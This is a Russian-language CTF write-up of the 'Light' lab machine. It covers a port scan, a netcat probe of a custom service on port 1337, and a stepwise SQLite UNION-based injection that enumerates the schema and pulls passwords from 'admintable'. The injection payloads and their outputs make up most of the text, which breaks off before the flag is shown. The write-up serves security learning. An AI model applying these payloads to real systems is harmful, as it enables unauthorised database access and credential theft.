**Отчет о пентесте машины Light**

**Цель:** Получение доступа к базе данных и извлечение флага через SQL-инъекцию.


### 1. Разведка и обнаружение уязвимостей

**1.1. Сканирование сети**  
Первым этапом проведено сканирование портов с использованием Nmap. Обнаружены следующие открытые порты:

- **22/tcp** – SSH (OpenSSH)
- **1337/tcp** – кастомное приложение (база данных Light)

**1.2. Анализ приложения**  
При подключении к порту `1337` через `nc` приложение запрашивает имя пользователя и возвращает пароль, если пользователь существует:

```
Please enter your username: smokey
Password: ...
```

**Вывод:** Приложение работает с базой данных и потенциально уязвимо к SQL-инъекции.

### 3. Эксплуатация SQL-инъекции

**3.1. Проверка инъекции**  
При вводе `' OR '1'='1` приложение возвращает пароль:

```
Please enter your username: ' OR '1'='1
Password: tF8tj2o94WE4LKC
```

**Вывод:** SQL-инъекция подтверждена. Фильтр блокирует `/*`, `--`, `%0b`.

**3.2. Определение количества столбцов**  
Запрос `' Union Select NULL Where '1'='1` возвращает `Password: None`, что подтверждает **один столбец** в результате.

**3.3. Получение версии SQLite**  
Запрос `' Union Select sqlite_version() Where '1'='1` возвращает:

```
Password: 3.31.1
```

**3.4. Определение таблиц**  
Запрос `' Union Select tbl_name From sqlite_master Where type='table'` возвращает:

```
Password: admintable
```

**3.5. Получение структуры таблицы**  
Запрос `' Union Select sql From sqlite_master Where type!='meta' And sql NOT NULL And name='admintable'` возвращает:

```sql
CREATE TABLE admintable (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password INTEGER)
```

**3.6. Извлечение данных**  
Запрос `' Union Select username From admintable Where id='1` возвращает:

```

```

Запрос `' Union Select password from admintable Where id='2` возвращает флаг:
